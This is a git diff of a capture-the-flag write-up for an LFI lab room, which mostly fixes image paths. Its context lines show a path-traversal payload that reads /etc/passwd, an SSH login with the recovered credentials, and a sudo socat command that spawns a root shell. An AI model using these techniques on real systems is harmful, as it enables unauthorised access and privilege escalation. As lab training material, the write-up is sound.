@@ -1,6 +1,6 @@
 # LFI Vulnerability
 
-[!If you want to check my notes about IDORs](https://github.com/itKhalid143/websec100/blob/main/Days/Day8-LFI%20%26%26%20RFI.md)
+[If you want to check my notes about IDORs](https://github.com/itKhalid143/websec100/blob/main/Days/Day8-LFI%20%26%26%20RFI.md)
 
 ***
 
@@ -28,14 +28,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 
 - My eyes went directly to ```LFI-attack``` post, as this room was for LFI.
-![****](/Pictures/1.PNG)
+![****](/Inclusion/Pictures/1.PNG)
 
 - First thing we can see, this text is weird! then I thought that could be a file loaded from the host using execute function! Then why not Input different path in the Url! and this was my payload:
 
 ```
 http://10.10.216.81/article?name=../../../../etc/passwd
 ```
-![****](/Pictures/2.PNG)
+![****](/Inclusion/Pictures/2.PNG)
 
 - And here we have the username and the password! let try to SSH!
 ```
@@ -43,7 +43,7 @@ ssh falconfeast@10.10.216.81
 ```
 ### Boom! We're in!
 
-![****](/Pictures/user.PNG)
+![****](/Inclusion/Pictures/user.PNG)
 
 ## root.txt
 
@@ -53,7 +53,7 @@ sudo -l
 ```
 the result was!
 
-![****](/Pictures/root.PNG)
+![****](/Inclusion/Pictures/root.PNG)
 
 ```java
 Matching Defaults entries for falconfeast on inclusion:
@@ -68,6 +68,6 @@ Here we can run ```/usr/bin/socat``` as root! a quick search on gtfobins, the pa
 sudo /usr/bin/socat stdin exec:/bin/sh
 ``` 
 
-![****](/Pictures/root2.PNG)
+![****](/Inclusion/Pictures/root2.PNG)
 
 #Thank you!
